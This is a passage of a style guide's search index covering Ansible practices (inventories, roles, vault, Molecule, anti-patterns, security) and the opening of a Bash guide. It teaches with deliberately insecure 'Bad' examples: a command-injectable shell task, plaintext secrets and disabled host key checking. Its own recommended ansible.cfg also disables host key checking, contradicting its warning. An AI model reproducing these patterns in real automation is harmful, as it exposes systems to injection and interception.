ansible_host=192.168.1.20\n\n[appservers]\napp1.example.com\napp2.example.com\n\n[production:children]\nwebservers\ndbservers\nappservers\n\n[production:vars]\nansible_user=deploy\nansible_become=true\nenvironment=production\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#static-inventory-yaml-format","title":"Static Inventory (YAML format)","text":"<pre><code>## inventory/production.yml\nall:\n  children:\n    webservers:\n      hosts:\n        web1.example.com:\n          ansible_host: 192.168.1.10\n        web2.example.com:\n          ansible_host: 192.168.1.11\n    dbservers:\n      hosts:\n        db1.example.com:\n          ansible_host: 192.168.1.20\n    appservers:\n      hosts:\n        app1.example.com:\n        app2.example.com:\n  vars:\n    ansible_user: deploy\n    ansible_become: true\n    environment: production\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#group-variables","title":"Group Variables","text":"<pre><code>inventory/\n\u251c\u2500\u2500 production.yml\n\u2514\u2500\u2500 group_vars/\n    \u251c\u2500\u2500 all.yml\n    \u251c\u2500\u2500 webservers.yml\n    \u2514\u2500\u2500 dbservers.yml\n</code></pre> <pre><code>## group_vars/webservers.yml\n---\nnginx_port: 80\nnginx_worker_processes: 4\nssl_certificate: /etc/ssl/certs/example.com.crt\nssl_certificate_key: /etc/ssl/private/example.com.key\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#variable-precedence","title":"Variable Precedence","text":"<p>Ansible variable precedence (lowest to highest):</p> <ol> <li>Command line values (--extra-vars)</li> <li>Role defaults (defaults/main.yml)</li> <li>Inventory file or script group vars</li> <li>Inventory group_vars/all</li> <li>Playbook group_vars/all</li> <li>Inventory group_vars/*</li> <li>Playbook group_vars/*</li> <li>Inventory file or script host vars</li> <li>Inventory host_vars/*</li> <li>Playbook host_vars/*</li> <li>Host facts / cached set_facts</li> <li>Play vars</li> <li>Play vars_prompt</li> <li>Play vars_files</li> <li>Role vars (vars/main.yml)</li> <li>Block vars (only for tasks in block)</li> <li>Task vars (only for the task)</li> <li>Include vars</li> <li>Set_facts / registered vars</li> <li>Role (and include_role) params</li> <li>Include params</li> <li>Extra vars (always win precedence)</li> </ol> <pre><code>## Example showing variable override\n---\n- name: Variable precedence example\n  hosts: all\n  vars:\n    app_port: 8080  # Play vars\n  tasks:\n    - name: Show port (will use 9000 from task vars)\n      ansible.builtin.debug:\n        msg: \"Port is {{ app_port }}\"\n      vars:\n        app_port: 9000  # Task vars (higher precedence)\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#role-structure","title":"Role Structure","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#modern-role-with-collection","title":"Modern Role with Collection","text":"<pre><code>roles/webserver/\n\u251c\u2500\u2500 defaults/\n\u2502   \u2514\u2500\u2500 main.yml          # Default variables (lowest precedence)\n\u251c\u2500\u2500 vars/\n\u2502   \u2514\u2500\u2500 main.yml          # Role variables (higher precedence)\n\u251c\u2500\u2500 tasks/\n\u2502   \u2514\u2500\u2500 main.yml          # Main task list\n\u251c\u2500\u2500 handlers/\n\u2502   \u2514\u2500\u2500 main.yml          # Handler definitions\n\u251c\u2500\u2500 templates/\n\u2502   \u2514\u2500\u2500 nginx.conf.j2     # Jinja2 templates\n\u251c\u2500\u2500 files/\n\u2502   \u2514\u2500\u2500 ssl_cert.crt      # Static files\n\u251c\u2500\u2500 meta/\n\u2502   \u2514\u2500\u2500 main.yml          # Role metadata and dependencies\n\u2514\u2500\u2500 README.md             # Role documentation\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#role-example","title":"Role Example","text":"<pre><code>## roles/webserver/tasks/main.yml\n---\n- name: Install nginx\n  ansible.builtin.package:\n    name: \"{{ nginx_package_name }}\"\n    state: present\n\n- name: Create document root\n  ansible.builtin.file:\n    path: \"{{ nginx_document_root }}\"\n    state: directory\n    owner: \"{{ nginx_user }}\"\n    group: \"{{ nginx_group }}\"\n    mode: '0755'\n\n- name: Deploy nginx configuration\n  ansible.builtin.template:\n    src: nginx.conf.j2\n    dest: /etc/nginx/nginx.conf\n    validate: nginx -t -c %s\n  notify: Reload nginx\n\n- name: Ensure nginx is running\n  ansible.builtin.service:\n    name: nginx\n    state: started\n    enabled: true\n</code></pre> <pre><code>## roles/webserver/defaults/main.yml\n---\nnginx_package_name: nginx\nnginx_user: www-data\nnginx_group: www-data\nnginx_document_root: /var/www/html\nnginx_port: 80\nnginx_worker_processes: auto\n</code></pre> <pre><code>## roles/webserver/meta/main.yml\n---\ngalaxy_info:\n  author: Tyler Dukes\n  description: Configure nginx web server\n  min_ansible_version: \"2.15\"\n  platforms:\n    - name: Ubuntu\n      versions:\n        - focal\n        - jammy\n  galaxy_tags:\n    - web\n    - nginx\n\ndependencies:\n  - role: my_namespace.my_collection.common\n    vars:\n      common_packages:\n        - curl\n        - vim\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#handlers","title":"Handlers","text":"<pre><code>## handlers/main.yml\n---\n- name: Reload nginx\n  ansible.builtin.service:\n    name: nginx\n    state: reloaded\n\n- name: Restart nginx\n  ansible.builtin.service:\n    name: nginx\n    state: restarted\n\n- name: Reload systemd\n  ansible.builtin.systemd:\n    daemon_reload: true\n\n## Using handlers in tasks\n---\n- name: Update nginx configuration\n  ansible.builtin.template:\n    src: nginx.conf.j2\n    dest: /etc/nginx/nginx.conf\n  notify:\n    - Reload systemd\n    - Reload nginx  # Handlers run in order defined\n\n## Force handler execution\n- name: Flush handlers\n  ansible.builtin.meta: flush_handlers\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#jinja2-templates","title":"Jinja2 Templates","text":"<pre><code>{# templates/nginx.conf.j2 #}\nuser {{ nginx_user }};\nworker_processes {{ nginx_worker_processes }};\n\nevents {\n    worker_connections {{ nginx_worker_connections | default(1024) }};\n}\n\nhttp {\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    {% for server in nginx_servers %}\n    server {\n        listen {{ server.port | default(80) }};\n        server_name {{ server.name }};\n        root {{ server.document_root }};\n\n        {% if server.ssl_enabled | default(false) %}\n        ssl_certificate {{ server.ssl_cert }};\n        ssl_certificate_key {{ server.ssl_key }};\n        {% endif %}\n\n        location / {\n            try_files $uri $uri/ =404;\n        }\n    }\n    {% endfor %}\n}\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#jinja2-filters","title":"Jinja2 Filters","text":"<pre><code>## Common filters\n- name: Use filters in templates\n  ansible.builtin.debug:\n    msg: |\n      Uppercase: {{ hostname | upper }}\n      Lowercase: {{ hostname | lower }}\n      Default: {{ port | default(8080) }}\n      String to int: {{ \"42\" | int }}\n      Join list: {{ ['a', 'b', 'c'] | join(',') }}\n      Regex replace: {{ 'foo bar' | regex_replace('bar', 'baz') }}\n      To JSON: {{ my_dict | to_json }}\n      To YAML: {{ my_dict | to_nice_yaml }}\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#ansible-vault","title":"Ansible Vault","text":"<pre><code>## Create encrypted file\nansible-vault create secrets.yml\n\n## Edit encrypted file\nansible-vault edit secrets.yml\n\n## Encrypt existing file\nansible-vault encrypt vars/secrets.yml\n\n## Decrypt file\nansible-vault decrypt vars/secrets.yml\n\n## View encrypted file\nansible-vault view secrets.yml\n\n## Rekey (change password)\nansible-vault rekey secrets.yml\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#using-vault-in-playbooks","title":"Using Vault in Playbooks","text":"<pre><code>## Store sensitive data in vault\n## vars/secrets.yml (encrypted)\n---\ndb_password: super_secret_password\napi_key: secret_api_key_12345\n\n## Reference vault file in playbook\n---\n- name: Deploy application\n  hosts: appservers\n  vars_files:\n    - vars/secrets.yml\n  tasks:\n    - name: Configure database connection\n      ansible.builtin.template:\n        src: database.yml.j2\n        dest: /etc/app/database.yml\n      no_log: true  # Don't log sensitive data\n\n## Run playbook with vault password\nansible-playbook site.yml --ask-vault-pass\nansible-playbook site.yml --vault-password-file ~/.vault_pass\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#tags-strategy","title":"Tags Strategy","text":"<pre><code>---\n- name: Full application deployment\n  hosts: appservers\n  tasks:\n    - name: Install dependencies\n      ansible.builtin.package:\n        name: \"{{ item }}\"\n        state: present\n      loop:\n        - python3\n        - python3-pip\n      tags:\n        - packages\n        - dependencies\n\n    - name: Deploy application code\n      ansible.builtin.git:\n        repo: https://github.com/example/app.git\n        dest: /opt/app\n        version: main\n      tags:\n        - deploy\n        - code\n\n    - name: Run database migrations\n      ansible.builtin.command:\n        cmd: python3 manage.py migrate\n        chdir: /opt/app\n      tags:\n        - deploy\n        - database\n        - migrations\n\n    - name: Restart application service\n      ansible.builtin.service:\n        name: myapp\n        state: restarted\n      tags:\n        - deploy\n        - restart\n\n## Run specific tags\n## ansible-playbook site.yml --tags \"deploy\"\n## ansible-playbook site.yml --tags \"packages,database\"\n## ansible-playbook site.yml --skip-tags \"migrations\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#error-handling","title":"Error Handling","text":"<pre><code>---\n- name: Error handling examples\n  hosts: all\n  tasks:\n    # Ignore errors\n    - name: Try to stop service (may not exist)\n      ansible.builtin.service:\n        name: optional-service\n        state: stopped\n      ignore_errors: true\n\n    # Conditional failure\n    - name: Check disk space\n      ansible.builtin.shell: df -h / | awk 'NR==2 {print $5}' | sed 's/%//'\n      register: disk_usage\n      failed_when: disk_usage.stdout | int &gt; 90\n      changed_when: false\n\n    # Custom failure message\n    - name: Validate configuration\n      ansible.builtin.command: validate-config.sh\n      register: validation\n      failed_when:\n        - validation.rc != 0\n        - \"'CRITICAL' in validation.stderr\"\n\n    # Block with rescue\n    - name: Deploy with rollback\n      block:\n        - name: Deploy new version\n          ansible.builtin.copy:\n            src: app-v2.jar\n            dest: /opt/app/app.jar\n          notify: Restart app\n\n        - name: Run health check\n          ansible.builtin.uri:\n            url: http://localhost:8080/health\n            status_code: 200\n          retries: 5\n          delay: 10\n\n      rescue:\n        - name: Rollback to previous version\n          ansible.builtin.copy:\n            src: app-v1.jar\n            dest: /opt/app/app.jar\n          notify: Restart app\n\n        - name: Send alert\n          ansible.builtin.debug:\n            msg: \"Deployment failed, rolled back to v1\"\n\n      always:\n        - name: Cleanup temp files\n          ansible.builtin.file:\n            path: /tmp/deploy\n            state: absent\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#testing-with-molecule","title":"Testing with Molecule","text":"<pre><code>## Initialize molecule scenario\nmolecule init scenario default\n\n## Run full test sequence\nmolecule test\n\n## Individual steps\nmolecule create       # Create test instances\nmolecule converge     # Run playbook\nmolecule verify       # Run test assertions\nmolecule destroy      # Destroy test instances\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#molecule-configuration","title":"Molecule Configuration","text":"<pre><code>## molecule/default/molecule.yml\n---\ndriver:\n  name: docker\n\nplatforms:\n  - name: ubuntu-22.04\n    image: ubuntu:22.04\n    pre_build_image: true\n\nprovisioner:\n  name: ansible\n  config_options:\n    defaults:\n      callbacks_enabled: profile_tasks\n\nverifier:\n  name: ansible\n\nscenario:\n  test_sequence:\n    - destroy\n    - create\n    - converge\n    - verify\n    - destroy\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#molecule-verify","title":"Molecule Verify","text":"<pre><code>## molecule/default/verify.yml\n---\n- name: Verify\n  hosts: all\n  gather_facts: false\n  tasks:\n    - name: Check nginx is installed\n      ansible.builtin.package:\n        name: nginx\n        state: present\n      check_mode: true\n      register: nginx_check\n      failed_when: nginx_check.changed\n\n    - name: Check nginx is running\n      ansible.builtin.service:\n        name: nginx\n        state: started\n      check_mode: true\n      register: nginx_service\n      failed_when: nginx_service.changed\n\n    - name: Test HTTP response\n      ansible.builtin.uri:\n        url: http://localhost:80\n        return_content: true\n      register: http_response\n      failed_when: \"'Hello World' not in http_response.content\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#anti-patterns","title":"Anti-Patterns","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-shellcommand-for-everything","title":"\u274c Avoid: Shell/Command for Everything","text":"<pre><code>## Bad - Using shell when module exists\n- name: Install package\n  ansible.builtin.shell: apt-get install -y nginx\n\n## Good - Use appropriate module\n- name: Install package\n  ansible.builtin.package:\n    name: nginx\n    state: present\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-hardcoded-values","title":"\u274c Avoid: Hardcoded Values","text":"<pre><code>## Bad - Hardcoded paths and values\n- name: Deploy config\n  ansible.builtin.copy:\n    src: app.conf\n    dest: /opt/myapp/config/app.conf\n    owner: ubuntu\n    mode: '0644'\n\n## Good - Use variables\n- name: Deploy config\n  ansible.builtin.copy:\n    src: app.conf\n    dest: \"{{ app_config_dir }}/app.conf\"\n    owner: \"{{ app_user }}\"\n    mode: \"{{ app_config_mode }}\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-no-idempotency","title":"\u274c Avoid: No Idempotency","text":"<pre><code>## Bad - Not idempotent (runs every time)\n- name: Download file\n  ansible.builtin.command: wget https://example.com/file.tar.gz\n  args:\n    chdir: /tmp\n\n## Good - Idempotent check\n- name: Download file\n  ansible.builtin.get_url:\n    url: https://example.com/file.tar.gz\n    dest: /tmp/file.tar.gz\n    mode: '0644'\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-ignoring-return-codes","title":"\u274c Avoid: Ignoring Return Codes","text":"<pre><code>## Bad - Ignoring all errors\n- name: Stop service\n  ansible.builtin.command: systemctl stop myapp\n  ignore_errors: true\n\n## Good - Specific error handling\n- name: Stop service\n  ansible.builtin.service:\n    name: myapp\n    state: stopped\n  register: service_stop\n  failed_when:\n    - service_stop.failed\n    - \"'could not be found' not in service_stop.msg\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-not-using-roles","title":"\u274c Avoid: Not Using Roles","text":"<pre><code>## Bad - Everything in one massive playbook\n- name: Configure web server\n  hosts: webservers\n  tasks:\n    - name: Install nginx\n      ansible.builtin.package:\n        name: nginx\n        state: present\n    - name: Copy nginx config\n      ansible.builtin.template:\n        src: nginx.conf.j2\n        dest: /etc/nginx/nginx.conf\n    # ... 50 more tasks ...\n\n## Good - Organized into roles\n- name: Configure web server\n  hosts: webservers\n  roles:\n    - role: nginx\n      vars:\n        nginx_worker_processes: 4\n    - role: ssl_certificates\n    - role: application\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-using-loop-with-package-module","title":"\u274c Avoid: Using Loop with Package Module","text":"<pre><code>## Bad - Inefficient loop\n- name: Install packages\n  ansible.builtin.package:\n    name: \"{{ item }}\"\n    state: present\n  loop:\n    - nginx\n    - postgresql\n    - redis\n\n## Good - Install all at once\n- name: Install packages\n  ansible.builtin.package:\n    name:\n      - nginx\n      - postgresql\n      - redis\n    state: present\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#avoid-no-proper-secret-management","title":"\u274c Avoid: No Proper Secret Management","text":"<pre><code>## Bad - Secrets in plain text\n- name: Configure database\n  ansible.builtin.template:\n    src: database.yml.j2\n    dest: /etc/app/database.yml\n  vars:\n    db_password: \"MySecretPassword123\"  # \u274c Plain text!\n\n## Good - Use Ansible Vault\n## Encrypt with: ansible-vault encrypt vars/secrets.yml\n- name: Configure database\n  ansible.builtin.template:\n    src: database.yml.j2\n    dest: /etc/app/database.yml\n  vars_files:\n    - vars/secrets.yml  # \u2705 Encrypted vault file\n\n## Or use vault inline\n- name: Configure database\n  ansible.builtin.template:\n    src: database.yml.j2\n    dest: /etc/app/database.yml\n  vars:\n    db_password: \"{{ vault_db_password }}\"  # \u2705 From vault\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#security-best-practices","title":"Security Best Practices","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#ansible-vault-for-secrets","title":"Ansible Vault for Secrets","text":"<p>Always encrypt sensitive data using Ansible Vault.</p> <pre><code>## Bad - Plain text secrets in vars file\n## vars/database.yml\ndb_host: \"prod-db.example.com\"\ndb_user: \"app_user\"\ndb_password: \"SuperSecret123\"  # NEVER store plain text passwords!\napi_key: \"sk_live_abc123xyz\"   # Exposed in version control!\n\n## Good - Use Ansible Vault for secrets\n## vars/vault.yml (encrypted with ansible-vault)\nvault_db_password: \"SuperSecret123\"\nvault_api_key: \"sk_live_abc123xyz\"\n\n## vars/database.yml (references vault variables)\ndb_host: \"prod-db.example.com\"\ndb_user: \"app_user\"\ndb_password: \"{{ vault_db_password }}\"\napi_key: \"{{ vault_api_key }}\"\n</code></pre> <pre><code>## Encrypt entire file\nansible-vault encrypt vars/vault.yml\n\n## Encrypt specific string\nansible-vault encrypt_string 'SuperSecret123' --name 'vault_db_password'\n\n## Run playbook with vault password\nansible-playbook site.yml --ask-vault-pass\n\n## Use password file (ensure file has restricted permissions)\nansible-playbook site.yml --vault-password-file ~/.vault_pass\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#privilege-escalation-security","title":"Privilege Escalation Security","text":"<p>Use <code>become</code> safely and only when necessary.</p> <pre><code>## Bad - Running everything as root\n- name: Deploy application\n  hosts: webservers\n  become: yes  # Don't use become for entire play!\n  tasks:\n    - name: Copy config file\n      copy:\n        src: config.yml\n        dest: /home/appuser/config.yml  # Doesn't need root!\n\n## Good - Use become only for tasks that require it\n- name: Deploy application\n  hosts: webservers\n  tasks:\n    - name: Install system package\n      become: yes  # Only escalate when needed\n      apt:\n        name: nginx\n        state: present\n\n    - name: Copy config file\n      copy:\n        src: config.yml\n        dest: /home/appuser/config.yml\n        owner: appuser\n        group: appuser\n        mode: '0644'\n\n    - name: Start service\n      become: yes\n      systemd:\n        name: nginx\n        state: started\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#safe-command-execution","title":"Safe Command Execution","text":"<p>Prevent command injection when using shell/command modules.</p> <pre><code>## Bad - Vulnerable to injection\n- name: Process user input\n  shell: \"grep {{ user_search }} /var/log/app.log\"  # Injection risk!\n  vars:\n    user_search: \"{{ lookup('env', 'USER_INPUT') }}\"\n\n## Good - Use command module with arguments\n- name: Process user input safely\n  command:\n    cmd: grep\n    argv:\n      - \"{{ user_search | quote }}\"\n      - /var/log/app.log\n\n## Good - Validate input with assertions\n- name: Validate input\n  assert:\n    that:\n      - user_search is regex('^[a-zA-Z0-9_-]+$')\n    fail_msg: \"Invalid search input format\"\n\n- name: Process validated input\n  shell: \"grep {{ user_search | quote }} /var/log/app.log\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#ssh-key-management","title":"SSH Key Management","text":"<pre><code>## Bad - Disabling host key checking globally\n## ansible.cfg\n[defaults]\nhost_key_checking = False  # SECURITY RISK!\n\n## Good - Manage SSH known hosts properly\n- name: Add SSH host key to known_hosts\n  known_hosts:\n    name: \"{{ inventory_hostname }}\"\n    key: \"{{ lookup('pipe', 'ssh-keyscan -H ' + inventory_hostname) }}\"\n    state: present\n\n## Good - Use SSH key with passphrase\n## ansible.cfg\n[defaults]\nprivate_key_file = ~/.ssh/ansible_deploy_key\nhost_key_checking = True  # Keep enabled!\n\n## Ensure SSH key has proper permissions\n- name: Set SSH key permissions\n  file:\n    path: ~/.ssh/ansible_deploy_key\n    mode: '0600'\n  delegate_to: localhost\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#secure-file-permissions","title":"Secure File Permissions","text":"<p>Always set appropriate file permissions.</p> <pre><code>## Bad - World-readable sensitive files\n- name: Deploy database config\n  copy:\n    src: database.conf\n    dest: /etc/app/database.conf  # Default permissions too open!\n\n## Good - Restrict sensitive file permissions\n- name: Deploy database config\n  copy:\n    src: database.conf\n    dest: /etc/app/database.conf\n    owner: appuser\n    group: appuser\n    mode: '0600'  # Only owner can read/write\n\n## Good - Secure directory permissions\n- name: Create config directory\n  file:\n    path: /etc/app/secrets\n    state: directory\n    owner: appuser\n    group: appuser\n    mode: '0750'  # Owner: rwx, Group: rx, Other: none\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#inventory-security","title":"Inventory Security","text":"<p>Protect inventory files and limit exposure.</p> <pre><code>## Bad - Sensitive data in inventory\n## inventory/production.ini\n[webservers]\nweb1.example.com ansible_ssh_pass=MyPassword123  # NEVER!\nweb2.example.com ansible_become_pass=RootPass456  # EXPOSED!\n\n## Good - Use vault for inventory variables\n## inventory/production.yml\nall:\n  children:\n    webservers:\n      hosts:\n        web1.example.com:\n        web2.example.com:\n      vars:\n        ansible_ssh_pass: \"{{ vault_ssh_password }}\"\n        ansible_become_pass: \"{{ vault_become_password }}\"\n\n## Better - Use SSH keys instead of passwords\n[webservers]\nweb1.example.com ansible_ssh_private_key_file=~/.ssh/deploy_key\nweb2.example.com ansible_ssh_private_key_file=~/.ssh/deploy_key\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#secure-downloads-and-package-installation","title":"Secure Downloads and Package Installation","text":"<p>Verify checksums and signatures when downloading files.</p> <pre><code>## Bad - Download without verification\n- name: Download binary\n  get_url:\n    url: https://example.com/app.tar.gz\n    dest: /tmp/app.tar.gz  # No verification!\n\n## Good - Verify checksum\n- name: Download and verify binary\n  get_url:\n    url: https://releases.example.com/app-v1.2.3.tar.gz\n    dest: /tmp/app.tar.gz\n    checksum: \"sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\"\n\n## Good - Use official package repositories\n- name: Install from trusted repository\n  apt:\n    name: nginx\n    state: present\n    update_cache: yes\n  become: yes\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#audit-logging","title":"Audit Logging","text":"<p>Enable logging for security auditing.</p> <pre><code>## ansible.cfg\n[defaults]\nlog_path = /var/log/ansible/ansible.log\ncallback_whitelist = profile_tasks, timer\n\n## Playbook example with logging\n- name: Security-sensitive operations\n  hosts: all\n  tasks:\n    - name: Log security action\n      debug:\n        msg: \"User {{ ansible_user }} performed security action at {{ ansible_date_time.iso8601 }}\"\n\n    - name: Perform sensitive operation\n      # ...\n      register: result\n\n    - name: Log operation result\n      lineinfile:\n        path: /var/log/app_security.log\n        line: \"{{ ansible_date_time.iso8601 }} - {{ ansible_user }} - {{ result.changed }}\"\n        create: yes\n        mode: '0640'\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#no-log-for-sensitive-output","title":"No Log for Sensitive Output","text":"<p>Prevent sensitive data from appearing in logs.</p> <pre><code>## Bad - Passwords logged in output\n- name: Set database password\n  mysql_user:\n    name: appuser\n    password: \"{{ db_password }}\"\n    state: present\n  # Password will appear in Ansible logs!\n\n## Good - Suppress logging of sensitive tasks\n- name: Set database password\n  mysql_user:\n    name: appuser\n    password: \"{{ db_password }}\"\n    state: present\n  no_log: true  # Prevents password from appearing in output\n\n## Good - Selectively show safe data\n- name: Deploy application\n  copy:\n    src: app.jar\n    dest: /opt/app/app.jar\n  register: deploy_result\n\n- name: Show deployment status (safe)\n  debug:\n    msg: \"Deployment changed: {{ deploy_result.changed }}\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#tool-configuration","title":"Tool Configuration","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#ansiblecfg","title":"ansible.cfg","text":"<pre><code>[defaults]\ninventory = inventory/production.yml\nremote_user = deploy\nhost_key_checking = False\nretry_files_enabled = False\ngathering = smart\nfact_caching = jsonfile\nfact_caching_connection = /tmp/ansible_facts\nfact_caching_timeout = 3600\nforks = 20\ntimeout = 30\n\n[privilege_escalation]\nbecome = True\nbecome_method = sudo\nbecome_user = root\nbecome_ask_pass = False\n\n[ssh_connection]\npipelining = True\ncontrol_path = /tmp/ansible-ssh-%%h-%%p-%%r\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#ansible-lint-configuration","title":"ansible-lint Configuration","text":"<pre><code>## .ansible-lint\n---\nskip_list:\n  - yaml[line-length]  # Ignore long lines\n\nuse_default_rules: true\nenable_list:\n  - no-log-password\n  - no-same-owner\n\nkinds:\n  - yaml: \"*.yaml\"\n  - yaml: \"*.yml\"\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#references","title":"References","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#official-documentation","title":"Official Documentation","text":"<ul> <li>Ansible Documentation</li> <li>Ansible Collections</li> <li>Ansible Best Practices</li> </ul>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#tools","title":"Tools","text":"<ul> <li>ansible-lint - Linter for Ansible playbooks</li> <li>Molecule - Testing framework for Ansible roles</li> <li>Ansible Galaxy - Repository for collections and roles</li> </ul>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#community-resources","title":"Community Resources","text":"<ul> <li>Ansible Community Guide</li> <li>Ansible Collections on GitHub</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/bash/","title":"Bash Scripting Style Guide","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#language-overview","title":"Language Overview","text":"<p>Bash (Bourne Again SHell) is a Unix shell and command language used for automation, system administration, and DevOps workflows. While powerful for system tasks, it has limitations that make higher-level languages preferable for complex logic.</p>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Procedural scripting language</li> <li>Type System: Untyped (strings by default)</li> <li>Execution: Interpreted by shell</li> <li>POSIX Compliance: Target POSIX sh for maximum portability</li> <li>Use Case: System automation, CI/CD pipelines, simple glue scripts</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#when-to-use-bash","title":"When to Use Bash","text":"<p>\u2705 Good Use Cases:</p> <ul> <li>Simple automation scripts (&lt; 200 lines)</li> <li>System administration tasks</li> <li>CI/CD pipeline steps</li> <li>Git hooks</li> <li>Docker entrypoint scripts</li> <li>Environment setup scripts</li> <li>File manipulation and system commands</li> </ul> <p>\u274c Avoid Bash For:</p> <ul> <li>Complex business logic</li> <li>Data processing and transformation</li> <li>API clients</li> <li>Scripts requiring JSON/YAML parsing</li> <li>Code requiring testing frameworks</li> <li>Scripts &gt; 200 lines</li> </ul> <p>Use Python, Go, or TypeScript instead when:</p> <ul> <li>You need data structures (maps, arrays, objects)</li> <li>JSON/YAML processing is required</li> <li>Complex error handling needed</li> <li>Unit testing is important</li> <li>Cross-platform compatibility matters</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Variables <code>lowercase</code> or <code>snake_case</code> <code>user_count</code>, <code>max_retries</code> Local variables lowercase Constants <code>UPPER_SNAKE_CASE</code> <code>MAX_RETRIES</code>, <code>API_URL</code> Readonly global variables Functions <code>lowercase</code> or <code>snake_case</code> <code>get_user()</code>, <code>validate_input()</code> Descriptive function names Environment Vars <code>UPPER_SNAKE_CASE</code> <code>PATH</code>, <code>HOME</code>, <code>MYAPP_CONFIG</code> Exported variables Files Scripts <code>kebab-case.sh</code> <code>deploy-app.sh</code>, <code>backup.sh</code> Lowercase with <code>.sh</code> extension Executable No extension <code>deploy-app</code> If in PATH, omit <code>.sh</code> Shebang POSIX <code>#!/bin/sh</code> <code>#!/bin/sh</code> Maximum portability Bash-specific <code>#!/usr/bin/env bash</code> <code>#!/usr/bin/env bash</code> When Bash features needed Formatting Indentation 2 spaces <code>if [ \"$x\" = \"y\" ]; then</code> Never tabs Line Length 80 characters <code># Keep lines short</code> Maximum readability Quoting Variables Always quote <code>\"$variable\"</code> Prevent word splitting Arrays Quote expansion <code>\"${array[@]}\"</code> Preserve elements Conditionals POSIX Test <code>[ condition ]</code> <code>if [ \"$x\" = \"y\" ]; then</code> Single brackets Bash Test <code>[[ condition ]]</code> <code>if [[ $x == y ]]; then</code> Double brackets (non-POSIX) Error Handling Exit on Error <code>set -e</code> <code>set -euo pipefail</code> Fail fast on errors Undefined Vars <code>set -u</code> <code>set -euo pipefail</code> Error on undefined variables Pipe Failures <code>set -o pipefail</code> <code>set -euo pipefail</code> Catch pipe failures Functions Declaration POSIX style <code>func_name() { ... }</code> No <code>function</code> keyword Return Exit code <code>return 1</code> 0 = success, non-zero = failure","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#posix-compliance","title":"POSIX Compliance","text":"<p>Write POSIX-compliant scripts for maximum portability across systems.</p> 